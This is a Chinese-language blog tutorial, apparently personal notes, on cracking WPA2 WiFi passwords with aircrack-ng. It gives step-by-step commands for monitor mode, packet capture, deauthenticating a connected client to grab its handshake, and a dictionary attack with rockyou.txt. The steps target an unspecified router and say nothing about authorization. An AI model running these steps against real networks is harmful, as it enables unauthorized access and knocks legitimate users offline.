---
title: aircrack-ng
date: 2019-12-10 19:35:51
categories: vm
tags: 
- secure

---

# aircrack-ng wifi 渗透

## 小知识

1. 现在的路由器基本都是WPA2的加密方式

2. Aircrack-ng是一个包含了多款工具的套装：

   | **组件名称**    | **描  述**                                                   |
   | :-------------- | ------------------------------------------------------------ |
   | **aircrack-ng** | 主要用于WEP及WPA-PSK密码的恢复，只要airodump-ng收集到足够数量的数据包，aircrack-ng就可以自动检测数据包并判断是否可以破解 |
   | **airmon-ng**   | 用于改变无线网卡工作模式，以便其他工具的顺利使用             |
   | **airodump-ng** | 用于捕获802.11数据报文，以便于aircrack-ng破解                |
   | **aireplay-ng** | 在进行WEP及WPA-PSK密码恢复时，可以根据需要创建特殊的无线网络数据报文及流量 |
   | **airserv-ng**  | 可以将无线网卡连接至某一特定端口，为攻击时灵活调用做准备     |
   | **airolib-ng**  | 进行WPA Rainbow Table攻击时使用，用于建立特定数据库文件      |
   | **airdecap-ng** | 用于解开处于加密状态的数据包                                 |
   | **tools**       | 其他用于辅助的工具，如airdriver-ng、packetforge-ng等         |

3. aireplay-ng当前支持的攻击种类如下：

   - Attack 0：解除认证攻击
   - Attack 1：伪造认证攻击
   - Attack 2：交互式注入攻击
   - Attack 3：ARP请求包重放攻击
   - Attack 4：chopchop Korek攻击
   - Attack 5：碎片交错攻击
   - Attack 6：Cafe-latte 攻击
   - Attack 7：面向客户的碎片攻击
   - Attack 8：WPA迁移模式
   - Attack 9：数据包注入测试

## 准备阶段

### 查看网卡

```
ifconfig
```

- 可以看到里面有个wlan0，如果没有的话就把无线网卡拔了再插一下。直到找到那个wlan0为止。
- 一定要保证它现在没有连接到任何wifi。上面那个wlan0里面没有ip地址什么的就说明现在不在连接中。

### 杀进程

```
airmon-ng check kill
```

### 载入无线网卡驱动，激活无线网卡至monitor即监听模式

就下面一句就可以了

```
#sudo ifconfig wlan0 up
airmon-ng start wlan0
```

- 可以看到下面写了monitor mode enable on **wlan0mon**

  重点!这句话的意思是，在监听模式下，无线网卡的名称已经变为了wlan0mon。

### 重启网卡

*感觉木啥用,随便搞不搞都行.*

``` 
sudo ifconfig wlan0mon down
sudo iwconfig wlan0mon mode monitor
sudo ifconfig wlan0mon up 
```

## 探索阶段

查看周围wifi的各种信息

```
airodump-ng wlan0mon
```

- **bssid**:mac地址
- essid:wifi名称
- **ch**:channel信道
- enc:加密方式
- 下半部分的表罗列出连接到我连到的wifi内的设备的mac地址

## 抓包阶段

我们已经看到了要攻击的路由器的mac地址和其中的客户端的mac地址，还有工作频道。执行：

```
airodump-ng wlan0mon --bssid 路由器的mac地址 -c 信道 -w wpa
```

- --bssid 是路由器的mac地址
- -w 是写入到文件wpa中
- -c 11 是频道11

## 攻击阶段

这里为了获得破解所需的WPA2握手验证的整个完整数据包，我们将会发送一种称之为“Deauth”的数据包来将已经连接至无线路由器的合法无线客户端强制断开，此时，客户端就会自动重新连接无线路由器，我们也就有机会捕获到包含WPA2握手验证的完整数据包了。

```
aireplay-ng -0 1 –a 路由mac地址 -c 目标mac地址 wlan0mon
```

- -0 采用deauth攻击模式，后面跟上攻击次数
- -a 后跟路由器的mac地址
- -c 后跟客户端的mac地址

注意看抓包页面右上角是否出现**WPA handshake [路由地址]**

这步很重要,要反复直到刷出

## 破解阶段

**用kali自带字典爆破**

1. 看看

```
ls
```

2. 使用Kali Linux中默认存在的字典，目录为/usr/share/wordlists/rockyou.txt.zip，其中需要使用命令来解压：

这步只需要做一次，下次就不用做了，因为已经解压好了

如果出现错误，按路径找到文件手动解压

~~这操蛋的人生~~

```
gunzip /usr/share/wordlists/rockyou.txt.zip
```

这里顺便记录一下Kali中几个常用的字典文件的位置：

/usr/share/john/password.lst

/usr/share/wfuzz/wordlist

/usr/share/ wordlists

3. 破解

至于这里为什么是wpa-04，因为我~~傻傻的~~做了四次抓包。

```
aircrack-ng -w /usr/share/wordlists/rockyou.txt wpa-04.cap
```

**常规**

使用aircrack-ng进行破解

1. 先看看我们抓到的握手包是什么名字

```
ls
```

可以看到一个叫做longas-01.ivs的，这个就是我们要破解的文件。
这时候我们需要准备一个字典文件用来破解这个longas-01.ivs。

2. 可以使用crunch这个软件生成字典。
3. 破解

```
aircrack-ng -w dict1.txt longas-01.ivs
```

此时的破解速度跟使用的机器性能和字典大小有关。为了节省时间可以把密码直接加入到字典中了。

